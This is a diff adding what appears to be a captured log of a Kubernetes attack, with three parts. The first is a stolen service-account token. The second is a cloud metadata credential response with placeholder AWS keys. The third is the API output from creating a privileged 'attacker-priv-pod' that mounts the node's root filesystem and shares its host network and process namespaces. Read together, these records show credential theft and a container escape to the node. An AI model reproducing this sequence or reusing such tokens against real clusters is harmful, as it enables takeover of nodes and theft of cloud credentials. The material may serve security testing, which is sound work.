@@ -1,0 +1,182 @@
+---SA_TOKEN---
+eyJhbGciOiJSUzI1NiIsImtpZCI6IklFeEd4WG5zakVkSm1lZDdReTRZbGtNWFdJRnpqck04NkRtLU5RaEtMeEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODIzMTc1ODI3LCJpYXQiOjE3OTE2Mzk4MjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiODVmMzU2ZTItMTVmYy00NTIxLThjOWItN2E2NjI2MWQxZDFhIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiaGYtZGVtby1jb250cm9sLXBsYW5lIiwidWlkIjoiNDkyOTcwMDgtZDY2Ni00YjEwLThiOWYtYjZjMWNlMmRiMTA0In0sInBvZCI6eyJuYW1lIjoiZGF0YXNldC13b3JrZXItNjlkNDVjNzU4Zi1qNjc0NSIsInVpZCI6IjYzYTVkYTUzLTAxMjQtNGQyYy05MjVmLThlODM3MGE3OWE5ZCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGF0YXNldC13b3JrZXItc2EiLCJ1aWQiOiJlZGU0OWU0Mi1hMWM3LTRjNzUtYjM5Yi1hZmY3NWEyNGI0NTMifSwid2FybmFmdGVyIjoxNzkxNjQzNDM0fSwibmJmIjoxNzkxNjM5ODI3LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDpkYXRhc2V0LXdvcmtlci1zYSJ9.P-qo7elOCEKz4KfXNNLrYWp2X1RyvPG1qh2qd9hLbuv4wfob8Eqn7uYs9yWnv2_ku4rAyI4J8XhG7WxuuJzYmYhyL0MKawQOZYB69cNmMMGvgwfNyHgjBrZyAO9ZSavZeAL8tgFqGHAMAyaIQLkh5Y_ifz2wf-59ko1-NU2hLP4Oypzk_zNH2rfcYcCXFqD8MwdAwDjuQ_qt8kq3lgcoV3YEJGrw82zfdtYlfggKMvOfso-hLnyVptn1w2SZZ-w12RNxj_qqs9YfQeVP3Q1BET1lzgHxyUT8rpLbADeoDTxTwtAmjKiLXZk27r_B2SfTk1VBnN7oV1DPruCY0Xr2AQ
+---IMDS---
+{"Code": "Success", "LastUpdated": "2026-09-10T12:00:00Z", "Type": "AWS-HMAC", "AccessKeyId": "ASIAFAKEACCESSKEYID01", "SecretAccessKey": "FakeSecretAccessKey0123456789abcdefghij", "Token": "FakeSessionTokenAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "Expiration": "2026-09-10T18:00:00Z"}
+---POD_CREATE---
+{
+  "kind": "Pod",
+  "apiVersion": "v1",
+  "metadata": {
+    "name": "attacker-priv-pod",
+    "namespace": "default",
+    "uid": "63edf4e7-fb84-4823-b2dc-270c3c6ae2f9",
+    "resourceVersion": "28400",
+    "generation": 1,
+    "creationTimestamp": "2026-10-10T13:55:17Z",
+    "managedFields": [
+      {
+        "manager": "curl",
+        "operation": "Update",
+        "apiVersion": "v1",
+        "time": "2026-10-10T13:55:17Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:spec": {
+            "f:containers": {
+              "k:{\"name\":\"pwn\"}": {
+                ".": {},
+                "f:command": {},
+                "f:image": {},
+                "f:imagePullPolicy": {},
+                "f:name": {},
+                "f:resources": {},
+                "f:securityContext": {
+                  ".": {},
+                  "f:privileged": {}
+                },
+                "f:terminationMessagePath": {},
+                "f:terminationMessagePolicy": {},
+                "f:volumeMounts": {
+                  ".": {},
+                  "k:{\"mountPath\":\"/host\"}": {
+                    ".": {},
+                    "f:mountPath": {},
+                    "f:name": {}
+                  }
+                }
+              }
+            },
+            "f:dnsPolicy": {},
+            "f:enableServiceLinks": {},
+            "f:hostNetwork": {},
+            "f:hostPID": {},
+            "f:restartPolicy": {},
+            "f:schedulerName": {},
+            "f:securityContext": {},
+            "f:terminationGracePeriodSeconds": {},
+            "f:volumes": {
+              ".": {},
+              "k:{\"name\":\"host-root\"}": {
+                ".": {},
+                "f:hostPath": {
+                  ".": {},
+                  "f:path": {},
+                  "f:type": {}
+                },
+                "f:name": {}
+              }
+            }
+          }
+        }
+      }
+    ]
+  },
+  "spec": {
+    "volumes": [
+      {
+        "name": "host-root",
+        "hostPath": {
+          "path": "/",
+          "type": ""
+        }
+      },
+      {
+        "name": "kube-api-access-l6r5c",
+        "projected": {
+          "sources": [
+            {
+              "serviceAccountToken": {
+                "expirationSeconds": 3607,
+                "path": "token"
+              }
+            },
+            {
+              "configMap": {
+                "name": "kube-root-ca.crt",
+                "items": [
+                  {
+                    "key": "ca.crt",
+                    "path": "ca.crt"
+                  }
+                ]
+              }
+            },
+            {
+              "downwardAPI": {
+                "items": [
+                  {
+                    "path": "namespace",
+                    "fieldRef": {
+                      "apiVersion": "v1",
+                      "fieldPath": "metadata.namespace"
+                    }
+                  }
+                ]
+              }
+            }
+          ],
+          "defaultMode": 420
+        }
+      }
+    ],
+    "containers": [
+      {
+        "name": "pwn",
+        "image": "alpine:latest",
+        "command": [
+          "tail",
+          "-f",
+          "/dev/null"
+        ],
+        "resources": {},
+        "volumeMounts": [
+          {
+            "name": "host-root",
+            "mountPath": "/host"
+          },
+          {
+            "name": "kube-api-access-l6r5c",
+            "readOnly": true,
+            "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount"
+          }
+        ],
+        "terminationMessagePath": "/dev/termination-log",
+        "terminationMessagePolicy": "File",
+        "imagePullPolicy": "Always",
+        "securityContext": {
+          "privileged": true
+        }
+      }
+    ],
+    "restartPolicy": "Always",
+    "terminationGracePeriodSeconds": 30,
+    "dnsPolicy": "ClusterFirst",
+    "serviceAccountName": "default",
+    "serviceAccount": "default",
+    "hostNetwork": true,
+    "hostPID": true,
+    "securityContext": {},
+    "schedulerName": "default-scheduler",
+    "tolerations": [
+      {
+        "key": "node.kubernetes.io/not-ready",
+        "operator": "Exists",
+        "effect": "NoExecute",
+        "tolerationSeconds": 300
+      },
+      {
+        "key": "node.kubernetes.io/unreachable",
+        "operator": "Exists",
+        "effect": "NoExecute",
+        "tolerationSeconds": 300
+      }
+    ],
+    "priority": 0,
+    "enableServiceLinks": true,
+    "preemptionPolicy": "PreemptLowerPriority"
+  },
+  "status": {
+    "phase": "Pending",
+    "qosClass": "BestEffort"
+  }
+}
